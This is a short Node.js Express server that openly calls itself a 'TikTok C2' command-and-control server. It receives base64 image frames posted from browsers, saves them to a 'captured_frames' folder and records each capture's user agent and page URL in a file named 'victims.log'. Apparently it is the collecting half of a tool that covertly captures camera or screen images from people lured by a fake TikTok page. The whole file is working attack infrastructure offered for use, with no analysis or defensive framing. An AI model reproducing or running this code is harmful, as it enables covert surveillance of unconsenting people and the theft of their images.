const express=require('express'),fs=require('fs'),path=require('path'),app=express(),PORT=8080;
app.use(express.json({limit:'50mb'}));app.use(express.static('.'));let frameCount=0;const outputDir='./captured_frames';
if(!fs.existsSync(outputDir))fs.mkdirSync(outputDir);
app.post('/frame',(req,res)=>{const{frame,timestamp,userAgent,url}=req.body;const frameNum=++frameCount;const buf=Buffer.from(frame.split(',')[1],'base64');fs.writeFileSync(`${outputDir}/frame_${frameNum}_${timestamp}.jpg`,buf);console.log(`[+] Frame #${frameNum} captured`);fs.appendFileSync('victims.log',`${new Date().toISOString()},${frameNum},${userAgent},${url}\n`);res.status(200).send('OK');});
app.get('/health',(req,res)=>res.send('TikTok C2 Active'));
app.listen(PORT,'0.0.0.0',()=>{console.log(`[*] C2 Server: http://0.0.0.0:${PORT}`);console.log(`[*] Frames: ${outputDir}`);});
